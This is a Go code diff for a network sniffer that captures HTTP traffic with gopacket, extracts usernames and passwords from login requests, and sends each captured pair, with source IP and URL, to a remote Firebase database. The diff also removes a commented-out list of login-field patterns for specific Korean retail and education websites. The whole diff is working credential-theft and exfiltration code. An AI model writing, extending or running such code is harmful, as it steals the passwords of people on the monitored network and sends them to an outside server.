@@ -2,7 +2,6 @@ package main
 
 import (
 	"bufio"
-	"encoding/json"
 	"io"
 	"io/ioutil"
 	"log"
@@ -17,25 +16,17 @@ import (
 	"github.com/google/gopacket/pcap"
 	"github.com/google/gopacket/tcpassembly"
 	"github.com/google/gopacket/tcpassembly/tcpreader"
+	"github.com/zabawaba99/firego"
 )
 
 var (
-	// reMap = map[string]*regexp.Regexp{
-	// "http://www.dailysecu.com/":   regexp.MustCompile(`&login_userid=(.+)&login_userpw=(.+)`),
-	// "http://www.hanbit.co.kr/":    regexp.MustCompile(`&m_id=(.+)&m_passwd=(.+)`),
-	// "http://www.icqa.or.kr/":      regexp.MustCompile(`&txtID=(.+)&txtPass=(.+)`),
-	// "http://www.giordano.co.kr/":  regexp.MustCompile(`Data%5Bid%5D=(.+)&Data%5Bpw%5D=(.+)`),
-	// "http://www.nike.co.kr/":      regexp.MustCompile(`&loginId=(.+)&password=(.+)`),
-	// "http://www.junggo.com/":      regexp.MustCompile(`&mb_id=(.+)&mb_password=(.+)`),
-	// "http://m.bunjang.co.kr/":     regexp.MustCompile(`userid=(.+)&userpw=(.+)`),
-	// "http://www.coocha.co.kr/":    regexp.MustCompile(`mid=(.+)&mpwd=(.+)`),
-	// "http://www.daisomall.co.kr/": regexp.MustCompile(`&id=(.+)&pw=(.+)`),
-	// "http://www.ebsi.co.kr/":      regexp.MustCompile(`username=(.+)&j_password=(.+)`),
-	// }
-
 	reID = regexp.MustCompile(`(?i)` + `[^&]*(?:id|user|name)[^&]*=([^&]+)`)
 	rePW = regexp.MustCompile(`(?i)` + `[^&]*(?:pass|pw)[^&]*=([^&]+)`)
 )
+
+type Row struct {
+	TIMESTAMP, IP, URL, ID, PW string
+}
 
 // httpStreamFactory implements tcpassembly.StreamFactory
 type httpStreamFactory struct{}
@@ -50,6 +41,7 @@ func (h *httpStreamFactory) New(a, _ gopacket.Flow) tcpassembly.Stream {
 			} else if err != nil {
 				// log.Println("Error parsing HTTP requests:", err)
 			} else {
+				// http asemble finish.
 				body, err := ioutil.ReadAll(req.Body)
 				defer req.Body.Close()
 				if err != nil {
@@ -62,21 +54,14 @@ func (h *httpStreamFactory) New(a, _ gopacket.Flow) tcpassembly.Stream {
 					}
 					ID, _ := url.QueryUnescape(parsed[0])
 					PW, _ := url.QueryUnescape(parsed[1])
-					wsData := struct {
-						Timestamp string
-						IP        string
-						URL       string
-						ID        string
-						PW        string
-					}{
+
+					uploadToFirebase(&Row{
 						time.Now().Format("2006-01-02 15:04:05"),
 						a.Src().String(),
 						URL,
 						ID,
 						PW,
-					}
-					b, _ := json.Marshal(wsData)
-					wsCh <- string(b)
+					})
 				}
 				// cookies := req.Cookies()
 				// if len(cookies) > 0 {
@@ -87,6 +72,14 @@ func (h *httpStreamFactory) New(a, _ gopacket.Flow) tcpassembly.Stream {
 		}
 	}()
 	return &r
+}
+
+func uploadToFirebase(row *Row) {
+	f := firego.New("https://ccit-matched-data.firebaseio.com", nil)
+	_, err := f.Push(row)
+	if err != nil {
+		log.Fatal(err)
+	}
 }
 
 func find(http []byte) []string {
